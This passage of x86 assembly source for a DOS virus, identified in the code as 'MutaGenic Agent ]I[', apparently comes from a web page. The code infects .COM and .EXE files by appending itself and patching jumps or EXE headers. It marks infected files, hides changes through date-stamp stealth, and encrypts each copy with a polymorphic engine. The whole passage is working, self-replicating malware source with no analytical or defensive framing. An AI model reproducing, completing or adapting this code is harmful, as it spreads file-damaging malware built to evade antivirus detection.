                mov     word ptr new_jump[1],ax

                add     ax,103h
                xchg    dx,ax
                call    write_it
                
                mov     cx,5
                mov     dx,offset new_jump
                mov     ah,40h
                call    int_21
stamp_n_close:                
                mov     cx,es:[di + 0Dh]
                mov     dx,es:[di + 0Fh]
                ror     dh,1
                add     dh,100
                rol     dh,1
                mov     ax,5701h
                call    int_21
dont_infect:
                mov     ah,3Eh
                call    int_21
cant_open:
                pop     es ds di si dx cx bx ax
                jmp     int_21_exit

infect_exe:
                cmp     word ptr read_buffer[26],0
                ja      dont_infect             ; don't infect overlay .EXE

                cmp     word ptr read_buffer[16],'GM'
                je      dont_infect             ; infected already

                push    es di

                push    cs                      ; save this header
                pop     es

                mov     si,offset read_buffer
                mov     di,offset orig_header
                mov     cx,14
                rep     movsw

                pop     di es

                mov     ax,word ptr orig_header[20]
                mov     exe_ip,ax
                mov     ax,word ptr orig_header[22]
                mov     exe_cs,ax
                mov     ax,word ptr orig_header[14]
                mov     exe_ss,ax
                mov     ax,word ptr orig_header[16]
                mov     exe_sp,ax

                mov     ax,es:[di + 11h]        ; file size        
                mov     dx,es:[di + 13h]

                push    ax dx                   ; (save these for later)

                push    bx
                mov     cl,12
                shl     dx,cl
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                add     dx,bx
                and     ax,15
                pop     bx

                sub     dx,word ptr orig_header[8]
                mov     word ptr orig_header[22],dx
                mov     word ptr orig_header[20],ax

                add     dx,80h          ; give stack some space
                mov     word ptr orig_header[14],dx
                mov     word ptr orig_header[16],'GM'
                
                pop     dx ax
                add     ax,VIRUS_SIZE + 28
                adc     dx,0

                mov     cx,512                  ; in pages
                div     cx                      ; then save results
                inc     ax
                mov     word ptr orig_header[2],dx
                mov     word ptr orig_header[4],ax

                mov     ax,4202h                ; to EOF
                cwd
                xor     cx,cx
                call    int_21

                mov     dx,word ptr orig_header[20]
                call    write_it

                mov     cx,28
                mov     dx,offset orig_header
                mov     ah,40h
                call    int_21

                jmp     stamp_n_close

write_it:
                push    dx
                mov     ax,2524h                ; trap int 24
                mov     dx,offset int_24
                call    int_21
                pop     dx

                push    es di                   ; call MutaGen
                push    cs
                pop     es
                mov     cx,VIRUS_SIZE
                mov     di,offset encrypt_buffer
                mov     si,offset virus_begin
                call    _mutagen
                pop     di es

                mov     si,cx
                mov     ah,40h
                call    int_21

                sub     si,VIRUS_SIZE + 300
                neg     si
                mov     cx,si
                mov     ah,40h
                mov     dx,offset encrypt_buffer + 200
                call    int_21

                mov     cx,28                   ; for stealth
                mov     dx,offset read_buffer
                mov     ah,40h
                call    int_21

                mov     word ptr es:[di + 15h],0
                mov     word ptr es:[di + 17h],0
                ret

                db      'MutaGenic Agent ]I[',0

int_24:                                 ; int 24 handler
                mov     al,3
                iret

new_jump        db      0E9h,00,00,4Dh,47h
pop_buffer      dw      0
read_buffer     dw      14 dup (20CDh)

virus_end       equ     $ + MGEN_SIZE
VIRUS_SIZE      equ     virus_end - virus_begin

orig_header     equ     virus_end
encrypt_buffer  equ     virus_end + 28
end_heap        equ     virus_end + 28 + VIRUS_SIZE + 300

MEM_SIZE        equ     end_heap - start

code            ends
                end     start

</textarea></td></tr></table></body></html>
